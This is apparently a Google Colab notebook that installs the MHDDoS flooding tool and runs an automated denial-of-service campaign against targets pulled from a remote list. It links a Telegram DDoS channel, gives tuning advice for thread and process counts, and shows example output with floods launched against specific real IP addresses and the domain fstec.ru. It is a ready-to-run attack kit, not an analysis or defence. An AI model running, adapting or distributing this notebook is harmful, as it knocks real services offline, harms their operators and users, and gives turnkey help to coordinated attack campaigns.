{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "auto_mhddos_no_proxy.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "========================================\n",
        "Menu RUNTIME -> RUN ALL\n",
        "========================================\n",
        "If no menu at the top, disable adBlock\n"
      ],
      "metadata": {
        "id": "02jB8Um4KqQS"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "This tool uses [mhddos](https://github.com/MHProDev/MHDDoS) to attack targets from [targets file](https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets). Targets are refreshed automatically.\n",
        "\n",
        "Telegram channel: [Украинский жнец (DDoS)](https://t.me/ukrainian_reaper_ddos)\n",
        "\n"
      ],
      "metadata": {
        "id": "e6KJLi-5Ih6R"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!apt-get install ifstat -y\n",
        "!apt-get upgrade ifstat -y\n",
        "!python -m pip install --upgrade pip\n",
        "%cd ~\n",
        "%rm -r auto_mhddos\n",
        "!git clone https://github.com/white-sagittarius/auto_mhddos.git\n",
        "%rm -r mhddos_proxy\n",
        "!git clone https://github.com/white-sagittarius/mhddos_proxy.git\n",
        "%cd mhddos_proxy\n",
        "!git clone https://github.com/MHProDev/MHDDoS.git\n",
        "!python3 -m pip install -r MHDDoS/requirements.txt\n",
        "%cd ~/auto_mhddos"
      ],
      "metadata": {
        "id": "iwL1D0yQ2Y5X"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!bash runner.sh"
      ],
      "metadata": {
        "id": "5R0oboScD87x"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "# Parameters\n",
        "\n",
        "*   `-r`, `--refresh-interval`. How frequently script should refresh targets. Download targets from [targets file](https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets) every NUMBER time units. SUFFIX may be \"m\" for minutes, \"h\" for hours or \"d\" for days. Suggested range: [1h, 1d]. Default: \"1h\"\n",
        "\n",
        "*   `-p`, `--process-count`. How many separate [mhddos](https://github.com/MHProDev/MHDDoS) instances should run for each target. Note, _more_ is not necessarily _better_. It is important to monitor network stats. Suggested range [1, 4]. Default: \"2\"\n",
        "\n",
        "*   `-t`, `--thread-count`. How many threads should send requests to a given target in parallel. Note, _more_ is not necessarily _better_. It is important to monitor network stats. Suggested range [250, 2000]. Default: \"500\"\n",
        "\n",
        "*   `-s`, `--stats-interval`. Frequentcy of network statistics output in seconds (i.e every N seconds). Format is \"HH:MM:SS\" - time in GMT+0, \"Kbps in\" - inbound traffic, \"Kbps out\" - outbound traffic. Example:\n",
        "```\n",
        "  Time           eth0       \n",
        "HH:MM:SS   Kbps in  Kbps out\n",
        "18:10:34   6939.88  152080.2\n",
        "18:10:44   6316.50  136691.0\n",
        "18:10:54   6737.13  147879.0\n",
        "18:11:04   6686.07  145726.9\n",
        "```\n",
        "Suggested range [10, 300]. Default: \"30\"\n",
        "*   `-d`, `--debug`. Whether to provide additional request details (forwarded to mhddos). Default: empty\n",
        "\n",
        "\n",
        "Please note, that _target_ is as single line from [targets file](https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets) that might contain multiple domains or IP addresses.\n",
        "\n",
        "\n",
        "---\n",
        "Example commands\n",
        "---\n",
        "\n",
        "* Run DDoS attack with all defaults\n",
        "```\n",
        "!bash runner.sh\n",
        "```\n",
        "\n",
        "* Run DDoS attack with with targets refreshed every 3 hours, spawning 1 mhddos proccess per target with 1000 threads each. Netwrok information is printed every 10 seconds. Additionally mhddos is requested to output request information\n",
        "```\n",
        "!bash runner.sh --refresh-interval 3h --thread-count 1000 --process-count 1 --stats-interval 10 --debug\n",
        "```\n",
        "\n",
        "* Same command using short options\n",
        "```\n",
        "!bash runner.sh -r 3h -t 1000 -p 1 -s 10 -d\n",
        "```\n",
        "\n",
        "Long and short options can be mixed in a single command. Order of options does not matter. No options are required.\n",
        "\n",
        "---\n",
        "#Example output\n",
        "---\n",
        "\n",
        "```\n",
        "/root/auto_mhddos\n",
        "\n",
        "Number of targets: 2\n",
        "\n",
        "\n",
        "python3 runner.py tcp://91.189.116.40:443 tcp://91.189.116.40:993 tcp://91.189.116.40:995 tcp://91.189.116.41:443 tcp://91.189.116.41:993 tcp://91.189.116.41:995 tcp://91.189.116.42:443 tcp://91.189.116.42:993 tcp://91.189.116.42:995 tcp://91.189.116.43:443 tcp://91.189.116.43:993 tcp://91.189.116.43:995 -t 500 -p 25200 --rpc 0 &\n",
        "\n",
        "python3 runner.py tcp://91.189.116.40:443 tcp://91.189.116.40:993 tcp://91.189.116.40:995 tcp://91.189.116.41:443 tcp://91.189.116.41:993 tcp://91.189.116.41:995 tcp://91.189.116.42:443 tcp://91.189.116.42:993 tcp://91.189.116.42:995 tcp://91.189.116.43:443 tcp://91.189.116.43:993 tcp://91.189.116.43:995 -t 500 -p 25200 --rpc 0 &\n",
        "\n",
        "python3 runner.py https://fstec.ru/ http://fstec.ru/ --http-methods CFB -t 500 -p 25200 --rpc 0 &\n",
        "\n",
        "python3 runner.py https://fstec.ru/ http://fstec.ru/ --http-methods CFB -t 500 -p 25200 --rpc 0 &\n",
        "\n",
        "DDoS is RUNNING. Next update of targets list in 1h\n",
        "DDoS is monitoring eth0 interface (HH:MM:SS | Kbps in | Kbps out)\n",
        "\n",
        "\n",
        "  Time           eth0       \n",
        "HH:MM:SS   Kbps in  Kbps out\n",
        "[18:08:01 - INFO] Empty Proxy File, running flood witout proxy\n",
        "[18:08:01 - INFO] Empty Proxy File, running flood witout proxy\n",
        "[18:08:01 - INFO] Empty Proxy File, running flood witout proxy\n",
        "[18:08:01 - INFO] Attack Started to 91.189.116.40 with TCP method for 25200 seconds, threads: 41!\n",
        "[18:08:01 - INFO] Empty Proxy File, running flood witout proxy\n",
        "[18:08:01 - INFO] Attack Started to 91.189.116.41 with TCP method for 25200 seconds, threads: 41!\n",
        "[18:08:06 - INFO] Attack Started to 91.189.116.42 with TCP method for 25200 seconds, threads: 41!\n",
        "18:08:14  17834.09  422949.0\n",
        "18:08:24  15512.54  417838.2\n",
        "18:09:54  16679.95  375654.5\n",
        "18:10:04  16205.72  371862.1\n",
        "[18:10:05 - INFO] Attack Started to fstec.ru with CFB method for 25200 seconds, threads: 250!\n",
        "18:10:14   9199.46  193562.4\n",
        "18:10:24   7727.81  163133.1\n",
        "[18:10:31 - INFO] Attack Started to fstec.ru with CFB method for 25200 seconds, threads: 250!\n",
        "18:10:34   6939.88  152080.2\n",
        "18:10:44   6316.50  136691.0\n",
        "```\n",
        "\n",
        "---\n"
      ],
      "metadata": {
        "id": "qKbhC91zI4jO"
      }
    }
  ]
}